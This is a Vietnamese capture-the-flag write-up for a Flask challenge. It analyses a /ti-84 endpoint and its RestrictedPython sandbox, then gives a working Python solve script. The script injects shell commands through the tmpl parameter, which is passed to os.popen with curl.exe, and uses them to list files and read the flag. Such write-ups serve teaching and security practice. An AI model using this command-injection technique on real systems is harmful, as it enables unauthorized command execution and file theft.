
![image](https://github.com/user-attachments/assets/5e5376be-2196-47fa-ba83-f091a8b23d3b)

Đầu tiên thì trong file server.py

Đây là một ứng dụng web Flask.
Đường dẫn /: Phục vụ static/index.html.
Đường dẫn /static:
Phục vụ các file tĩnh, đặc biệt là các file .tmpl.
Nó kiểm tra xem fpath được yêu cầu có tồn tại trong thư mục static và kết thúc bằng .tmpl hay không. Nếu không, nó mặc định là 🐈.tmpl.
Có một kiểm tra về "quá nhiều biểu tượng cảm xúc" (các ký tự có ord(c) > 127) trong URL.

![image](https://github.com/user-attachments/assets/09d51cda-72af-4fca-95eb-409d606bd03f)

Đường dẫn /ti-84: Đây là trọng tâm của thử thách.
Nó nhận hai tham số: code và tmpl.
Tham số code:
Có giới hạn độ dài (len(code) > 3) và kiểm tra sự hiện diện của các chữ số và các toán tử số học cơ bản (0-9+-*/). Nếu các điều kiện này được đáp ứng, nó sẽ trả về lỗi. Điều này cho thấy các biểu thức toán học trực tiếp không phải là cách khai thác được mong muốn.
code được chèn vào code_tmpl.py.
Tham số tmpl:
Tham số này được sử dụng để xây dựng một lệnh curl.exe để tìm nạp file mẫu từ điểm cuối /static.
Mẫu đã tìm nạp (out_tmpl) phải chứa {{out}}, nếu không, lỗi sẽ được trả về.
Thực thi mã:
code_tmpl đã sửa đổi (với code do người dùng cung cấp) được ghi vào một file Python tạm thời (tmpfile.py).
file tạm thời này sau đó được thực thi bằng python.exe.
Đầu ra chuẩn (stdout) và lỗi chuẩn (stderr) của tập lệnh Python được thực thi được ghi lại.
Cuối cùng: result đã ghi lại (đầu ra từ tập lệnh Python được thực thi) sau đó được thay thế vào out_tmpl đã tìm nạp tại chỗ giữ chỗ {{out}}

Tiếp theo là file code_tmpl.py

file này đóng vai trò là mẫu cho mã Python sẽ được thực thi.
Nó sử dụng RestrictedPython.compile_restricted để biên dịch code do người dùng cung cấp.
byte_code đã biên dịch sau đó được thực thi bằng eval.
Quan trọng là, __builtins__ được đặt rõ ràng thành một từ điển trống {}, điều này hạn chế nghiêm ngặt các hàm và đối tượng có thể được truy cập bởi mã được thực thi. Đây là một cơ chế sandbox.

![image](https://github.com/user-attachments/assets/06ad1bb2-7a7c-439f-894f-1aa3f252cc60)

Đầu tiên là file solve.py

```
import requests
import sys

target = sys.argv[1]
target = target.replace("http://", "").replace("https://", "")
target = "http://" + target


def exploit(cmd):
    return requests.get(target + "/ti-84", params={
        "code": "1+1",
        "tmpl": f"🐈.tmpl && {cmd} && echo "
    }).text

flag_path = exploit("dir").split("flag")[1].split(".txt")[0].strip()
flag_path = "flag" + flag_path + ".txt"
flag = exploit(f"type {flag_path}").split(".;,;.")[1].split("}")[0].strip()
print(f"Flag: .;,;.{flag}}}")
```

Tập lệnh này thể hiện một lỗ hổng chèn lệnh cơ bản.
Nó nhắm mục tiêu điểm cuối /ti-84.
Tham số tmpl được tạo để chèn các lệnh bằng cách sử dụng && và echo để trích xuất thông tin.
Đầu tiên, nó sử dụng dir để tìm tên file flag (giả sử nó chứa "flag" và kết thúc bằng ".txt").
Sau đó, nó sử dụng type để đọc nội dung của file flag.
Lỗ hổng ở đây nằm ở cách output_tmpl được sử dụng trong lệnh gọi os.popen trong server.py mà không có sự làm sạch thích hợp, 
cho phép chèn lệnh thông qua tham số tmpl. Cụ thể, os.popen(f"curl.exe -s {url}").read() lấy url, bao gồm output_tmpl do người dùng kiểm soát, 
cho phép chèn lệnh nếu output_tmpl chứa các ký tự meta của shell.

![image](https://github.com/user-attachments/assets/2857eb43-9843-4349-8c12-7b7d0e5e8b17)

Chạy file là ra được flag

